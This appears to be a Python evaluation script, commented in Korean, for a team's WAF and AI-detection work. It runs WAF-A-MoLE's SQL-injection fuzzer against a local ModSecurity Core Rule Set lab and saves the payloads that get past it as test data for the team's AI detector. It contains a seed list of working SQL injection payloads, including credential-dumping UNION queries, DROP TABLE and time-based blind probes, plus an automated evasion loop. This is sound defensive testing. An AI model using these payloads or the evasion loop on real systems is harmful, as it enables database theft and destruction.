"""WAF-A-MoLE(SQLi 적대적 변이)로 CRS를 우회하는 SQLi를 만들고, 그 우회 payload를 우리 AI가 잡는지 본다.

- 엔진: WAF-A-MoLE의 SqlFuzzer(의미 보존 SQLi 변이)만 재사용. 타깃 점수는 우리 CRS 랩(HTTP)에서.
  (modsec_wrapper는 pymodsecurity 빌드가 필요해 쓰지 않고, 랩에 직접 요청해 403 여부로 판정)
- 전제: wafs 랩이 떠 있어야 함 (기본 PL1 = 운영 WAF):
    docker compose -f wafs/docker-compose.yml up -d modsecurity   # localhost:8090
- 출력: dev_tools/datasets/evasion/evasion-samples.jsonl (원본 seed + 우회 변이, AI 스코어링용)
        dev_tools/datasets/evasion/summary.json (seed별 결과)
실행: python dev_tools/scripts/eval_evasion.py --wafamole <WAF-A-MoLE 클론 경로>
"""
import argparse, json, sys, time
from pathlib import Path

ROOT = Path(__file__).resolve().parents[2]
sys.path.insert(0, str(Path(__file__).resolve().parent))
import run_pipeline_test as rpt  # noqa: E402  (build_request/send 재사용)

SEEDS = [
    "1' OR '1'='1' -- -", "admin' -- -", "admin' #", "' OR 1=1-- -", "1' ORDER BY 3-- -",
    "1 UNION SELECT username,password FROM users-- -", "' UNION SELECT NULL,NULL,NULL-- -",
    "1'; DROP TABLE users-- -", "' OR 'x'='x", "1' AND 1=1-- -", "1' AND SLEEP(5)-- -",
    "' OR SLEEP(5)-- -", "1' WAITFOR DELAY '0:0:5'-- -", "1' UNION ALL SELECT @@version-- -",
    "' OR 1=1 LIMIT 1-- -", "1' AND extractvalue(1,concat(0x7e,version()))-- -", "1 OR 1=1",
    "' OR ''='", "1' OR '1'='1' /*", "1' OR 1=1#", "1' UNION SELECT table_name,2 FROM information_schema.tables-- -",
    "' AND 1=0 UNION SELECT NULL, concat(user,0x3a,password) FROM users-- -",
    "1' RLIKE (SELECT * FROM (SELECT(SLEEP(5)))a)-- -", "1) OR (1=1", "' OR 1=1 OR ''='",
    "1' GROUP BY columnnames having 1=1-- -", "1' AND 1=(SELECT COUNT(*) FROM users)-- -",
    "x' OR full_name LIKE '%Bob%",
]


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--wafamole", required=True, help="WAF-A-MoLE 클론 경로(SqlFuzzer import용)")
    ap.add_argument("--host", default="localhost")
    ap.add_argument("--port", type=int, default=8090)
    ap.add_argument("--rounds", type=int, default=60)
    ap.add_argument("--round-size", type=int, default=16)
    ap.add_argument("--out-dir", type=Path, default=ROOT / "dev_tools/datasets/evasion")
    a = ap.parse_args()
    sys.path.insert(0, a.wafamole)
    from wafamole.payloadfuzzer.sqlfuzzer import SqlFuzzer  # noqa: E402
    import random
    random.seed(42)
    block = {"403", "406"}

    def sample(payload):
        return {"sample_id": "c", "source": "evasion", "label_binary": 1, "label_families": ["sqli"],
                "method": "GET", "path": "/", "query": "q=" + payload, "body": "",
                "headers": [["host", "<host>"]], "content_type": ""}

    def classify(payload):
        """CRS 랩 점수(이진): 차단(403/406)=1.0, 통과=0.0. 낮을수록 우회."""
        st = rpt.send(rpt.build_request(sample(payload), "evd"), a.host, a.port)
        return 1.0 if st in block else 0.0

    def evade(seed):
        payload, best = seed, classify(seed)
        q = 1
        for _ in range(a.rounds):
            fz = SqlFuzzer(payload)
            cands = list({fz.fuzz() for _ in range(a.round_size)})
            scored = [(classify(c), c) for c in cands]
            q += len(cands)
            conf, cand = min(scored, key=lambda x: x[0])
            if conf <= best:
                best, payload = conf, cand
            if best < 0.5:
                return True, payload, q
        return False, payload, q

    a.out_dir.mkdir(parents=True, exist_ok=True)
    recs, summ = [], []
    t0 = time.time()
    for i, seed in enumerate(SEEDS):
        seed_blocked = classify(seed) >= 0.5
        recs.append({**sample(seed), "sample_id": f"seed_{i:03d}", "record_id": "seed", "kind": "seed",
                     "crs_blocked": seed_blocked, "payload": seed})
        if not seed_blocked:
            summ.append({"seed": seed, "crs_blocks_seed": False, "bypass_found": None})
            print(f"[{i}] seed가 이미 통과(CRS 미차단) — 스킵: {seed[:40]}", flush=True)
            continue
        ok, mut, q = evade(seed)
        summ.append({"seed": seed, "crs_blocks_seed": True, "bypass_found": ok,
                     "mutation": mut if ok else None, "queries": q})
        if ok:
            recs.append({**sample(mut), "sample_id": f"mut_{i:03d}", "record_id": "mutation", "kind": "mutation",
                         "crs_blocked": False, "payload": mut, "seed": seed})
        print(f"[{i}] {'우회 성공' if ok else '우회 실패'} ({q} 쿼리): {seed[:34]!r} -> {mut[:46]!r}", flush=True)

    (a.out_dir / "evasion-samples.jsonl").write_text(
        "\n".join(json.dumps(r, ensure_ascii=False) for r in recs) + "\n", encoding="utf-8")
    nseed = sum(1 for s in summ if s["crs_blocks_seed"])
    nby = sum(1 for s in summ if s.get("bypass_found"))
    out = {"seeds_total": len(SEEDS), "seeds_crs_blocked": nseed, "bypass_found": nby,
           "bypass_rate": round(nby / nseed, 3) if nseed else None, "elapsed": round(time.time() - t0), "detail": summ}
    (a.out_dir / "summary.json").write_text(json.dumps(out, ensure_ascii=False, indent=2), encoding="utf-8")
    print(f"\nCRS가 막던 seed {nseed}개 중 {nby}개에서 우회 변이 발견 ({100*nby/max(nseed,1):.0f}%). "
          f"AI 스코어링용 {len(recs)}건 저장 → {a.out_dir}/evasion-samples.jsonl ({out['elapsed']}s)", flush=True)


if __name__ == "__main__":
    main()
